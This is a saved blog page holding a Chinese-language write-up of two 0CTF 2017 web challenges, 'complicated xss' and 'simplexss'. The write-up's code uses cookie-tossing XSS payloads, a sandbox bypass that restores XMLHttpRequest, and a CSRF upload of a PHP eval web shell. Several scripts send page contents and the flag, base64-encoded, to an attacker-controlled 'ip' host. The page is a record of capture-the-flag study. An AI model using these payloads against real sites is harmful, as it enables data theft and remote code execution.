@@ -1,0 +1,310 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>0CTF-2017-web-writeup - l3m0n - 博客园</title>
+<link href="./0CTF-2017-web-writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./0CTF-2017-web-writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./0CTF-2017-web-writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./0CTF-2017-web-writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./0CTF-2017-web-writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./0CTF-2017-web-writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./0CTF-2017-web-writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./0CTF-2017-web-writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./0CTF-2017-web-writeup - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./0CTF-2017-web-writeup - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./0CTF-2017-web-writeup - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/0ctf_2017_web_writeup.html" id="cb_post_title_url">0CTF-2017-web-writeup</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>xss搞的很爽...</p>
+<h2 id="complicated-xss">complicated xss</h2>
+<p>题目描述：<code>The flag is in http://admin.government.vip:8000</code></p>
+<p>两个xss点。<br/>
+1、<code>http://government.vip/</code><br/>
+存储型xss，未做过滤，管理员会触发此xss</p>
+<pre><code>202.120.7.205 - - [20/Mar/2017:14:26:18 +0800] "GET /aaakkkkkkk0ctf HTTP/1.1" 404 433 "http://government.vip/data/9ba80c534965c4ca99620071816b9ded.html" "Mozilla/5.0 Chrome(phantomjs) for 0ctf2017 bymd5_salt"</code></pre>
+<p>2、<code>http://admin.government.vip:8000/</code><br/>
+输入点在cookie中的username</p>
+<p>现在出现的问题就是：因为同源政策的原因，肯定是不能利用government.vip的xss直接去获取到admin域下的网页内容<br/>
+不过admin有一个xss是在cookie中，其实cookie也是有一个同源政策，与域名的同源政策有些不同<br/>
+<img src="./0CTF-2017-web-writeup - l3m0n - 博客园/804631-20170320154405502-1474486829.png"/></p>
+<p>cookie的同源政策总结起来就是：</p>
+<pre><code>domain是向上通配的(这就可以导致子域名可以写cookie到父域)，而且不区分端口、是否https
+path是向下通配的</code></pre>
+<p>所以整改流程很明显：</p>
+<pre><code>1、管理员触发government.vip的xss，在cookie中写一个影响子域名的cookie，也就是username，然后跳转到http://admin.government.vip:8000/
+2、再次通过cookie中的xss，也就是在http://admin.government.vip:8000/域名下触发第二个xss点</code></pre>
+<p>验证码是惯例，直接php跑一下：</p>
+<pre><code>&lt;?php
+for ($i; $i &lt; 100000000; $i++) {
+    if (substr(md5($i), 0, 6) == 'd46240') {
+        echo $i;
+        exit();
+    }
+}</code></pre>
+<p>r.js</p>
+<pre><code>function setCookie(name,value){
+  var Days = 30;
+  var exp = new Date();
+  exp.setTime(exp.getTime() + Days*24*60*60*1000);
+  document.cookie = name + "="+ value + ";expires=" + exp.toGMTString() + ";path=/;domain=.government.vip";
+}
+
+setCookie('username','&lt;/script&gt;&lt;script src=//ip/r1.js&gt;&lt;/script&gt;')
+self.location='http://admin.government.vip:8000/';</code></pre>
+<p>这里面还存在一个坑，就是同名cookie的优先级问题.<br/>
+<img src="./0CTF-2017-web-writeup - l3m0n - 博客园/804631-20170321153847799-668713388.png"/></p>
+<p>浏览器应该读取哪个值呢?这个优先级遵守</p>
+<pre><code>更长path的cookie更靠前
+如果path长度相等，更早创建的cookie更靠前
+
+例如：
+服务器的path=/admin
+攻击者path=/admin/
+
+这样攻击者的cookie优先级就是最高的</code></pre>
+<p>r1.js</p>
+<pre><code>/*
+省略jquery文件内容
+*/
+function create_img(url){
+  var i = document.createElement("img");
+  i.setAttribute("src",url)
+  document.body.appendChild(i);
+}
+
+$(document).ready(function(){create_img("http://ip/?c="+window.btoa($(":root").html()));});</code></pre>
+<p>这样的话，可以获取到http://admin.government.vip:8000/的网页内容:</p>
+<pre><code>&lt;head&gt;
+&lt;title&gt;Admin Panel&lt;/title&gt;
+&lt;script&gt;
+//sandbox
+delete window.Function;
+delete window.eval;
+delete window.alert;
+delete window.XMLHttpRequest;
+delete window.Proxy;
+delete window.Image;
+delete window.postMessage;
+&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;&lt;h1&gt;Hello &lt;script src="//ip/r1.js"&gt;&lt;/script&gt;&lt;/h1&gt;
+
+&lt;p&gt;Upload your shell&lt;/p&gt;
+&lt;form action="/upload" method="post" enctype="multipart/form-data"&gt;
+&lt;p&gt;&lt;input type="file" name="file"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;input type="submit" value="upload"&gt;
+&lt;/p&gt;&lt;/form&gt;
+&lt;/body&gt;</code></pre>
+<p>接着分析，上面是有一个沙盒，应该是为了正常bot的运行吧。但是过滤了window.XMLHttpRequest真的不是很爽。在这找到可以这样恢复(表示这个恢复思路好强...)</p>
+<pre><code>https://segmentfault.com/q/1010000007477941
+
+function fix() {
+  var iframe = document.createElement('iframe')
+  iframe.src = 'about:blank'
+  document.body.appendChild(iframe)
+  window.XMLHttpRequest = iframe.contentWindow.XMLHttpRequest
+}
+fix()</code></pre>
+<p>最后一步当然就是通过csrf然后文件上传<br/>
+r2.js</p>
+<pre><code>function create_img(url){
+  var i = document.createElement("img");
+  i.setAttribute("src",url)
+  document.body.appendChild(i);
+}
+
+function get_html(e){
+  create_img("http://ip/?c="+window.btoa(e.target.responseText));
+}
+
+var request = false;
+if(window.XMLHttpRequest) {
+    request = new XMLHttpRequest();
+    if(request.overrideMimeType) {
+        request.overrideMimeType('text/xml');
+    }
+} else if (window.ActiveXObject) {
+    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+    for(var i=0; i&lt;versions.length; i++) {
+        try {
+            request = new ActiveXObject(versions);
+            } catch(e) {}
+    }
+}
+
+xmlhttp=request;
+
+var url= "http://admin.government.vip:8000/upload";
+
+var params="-----------------------------223972503529236\r\n"+ "Content-Disposition: form-data; name=\"upload\"\r\n"+ "\r\n"+ "submit" +"\r\n"+ "-----------------------------223972503529236\r\n"+ "Content-Disposition: form-data; name=\"file\"; filename=\"lemon.php\"\r\n"+ "Content-Type: application/octet-stream\r\n"+ "\r\n"+ "&lt;?php @eval($_GET[\'cmd\'])?&gt;\r\n"+ "-----------------------------223972503529236--\r\n";
+
+xmlhttp.open("POST", url, true);
+xmlhttp.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+xmlhttp.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
+xmlhttp.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------223972503529236");
+xmlhttp.withCredentials = "true";
+var aBody = new Uint8Array(params.length);
+for (var i = 0; i &lt; aBody.length; i++) aBody[i] = params.charCodeAt(i);
+xmlhttp.onload = get_html;
+xmlhttp.send(new Blob([aBody]));</code></pre>
+<p>get_flag</p>
+<p><img src="./0CTF-2017-web-writeup - l3m0n - 博客园/804631-20170320153306846-279919981.png"/></p>
+<h2 id="simplexss">simplexss</h2>
+<p>题目描述：flag在<code>https://router.vip/flag.php</code><br/>
+首先fuzz：</p>
+<pre><code>不可用：! “ # $ % &amp; ‘ ( ) , . / : ; &gt; ? @ [ ] ` { }
+
+可用：* + - &lt; = \ ^ _ | ~</code></pre>
+<p>可用这样突破：</p>
+<pre><code>&lt;link rel=import href=\\八进制ip</code></pre>
+<p>这里需要注意的是href的值，其中是<code>\\</code>，而不是<code>//</code>，html标签中可用<code>//</code>替代<code>http://</code>，但是这里为啥可用<code>\\</code>，因为<code>\\</code>在windows下会是file协议，在linux下才会是当前域的协议<br/>
+围观：<a class="uri" href="http://www.melodia.pw/?p=889">http://www.melodia.pw/?p=889</a></p>
+<p>index.php</p>
+<pre><code>&lt;?php header('Access-Control-Allow-Origin: *');?&gt;
+&lt;script&gt;
+var love={ajax:function(){var a;try{a=new XMLHttpRequest()}catch(e){try{a=new ActiveXObject("Msxml2.XMLHTTP")}catch(e){try{a=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){return false}}}return a},req:function(b,c,d,e){d=(d||"").toUpperCase();d=d||"GET";c=c||"";if(b){var a=this.ajax();a.open(d,b,true);if(d=="POST"){a.setRequestHeader("Content-type","application/x-www-form-urlencoded")}a.onreadystatechange=function(){if(a.readyState==4){if(e){e(a)}}};if((typeof c)=="object"){var f=[];for(var i in c){f.push(i+"="+encodeURIComponent(c[i]))}a.send(f.join("&amp;"))}else{a.send(c||null)}}},get:function(a,b){this.req(a,"","GET",b)},post:function(a,b,c){this.req(a,b,"POST",c)}};
+
+love.get("https://router.vip/flag.php",function(rs){
+  url = "https://ip/?data=" + window.btoa(rs.responseText)
+  love.get(url,function(rs){console.log(rs)});
+});
+&lt;/script&gt;</code></pre>
+<p>其中还需要配置一下https服务，参考：<code>http://www.cnblogs.com/best-jobs/p/3298258.html</code></p>
+<p>不过这样我只是在预览的时候成功，不知道是不是bot关闭了。<br/>
+看了小m的wp，应该是需要域名才能成功，但是域名会有一个<code>.</code>，23333，这里是还能利用中文的<code>。</code>，浏览器会自动转换为<code>.</code>，23333，感觉这是在坑国际友人。</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2017-03-20 15:43</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6589534" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6589534);return false;">收藏</a></div>
+</div>
+<script src="./0CTF-2017-web-writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6589534,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2017/3/20 15:43:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./0CTF-2017-web-writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./0CTF-2017-web-writeup - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./0CTF-2017-web-writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
